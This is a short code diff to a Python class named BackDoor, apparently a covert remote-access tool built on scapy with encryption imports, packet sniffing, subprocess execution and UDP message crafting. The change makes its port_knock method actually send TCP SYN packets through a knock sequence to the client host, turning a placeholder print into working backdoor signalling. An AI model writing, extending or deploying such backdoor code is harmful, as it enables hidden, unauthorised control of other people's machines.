@@ -1,6 +1,6 @@
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.primitives import padding
-from scapy.layers.inet import UDP, IP
+from scapy.layers.inet import UDP, IP, TCP
 from scapy.all import sniff, send
 from scapy.volatile import RandShort
 from subprocess import run
@@ -228,7 +228,9 @@ class BackDoor:
 
     def port_knock(self):
         for i in self.sequence:
-            print(i)
+            pkt = IP(dst=self.client) / TCP(dport=i, flags="S")
+            send(pkt, verbose=0)
+
     def craft_packet(self, msg: str):
         ip = IP(dst=self.client)
         udp = UDP(sport=RandShort(), dport=self.send_port)
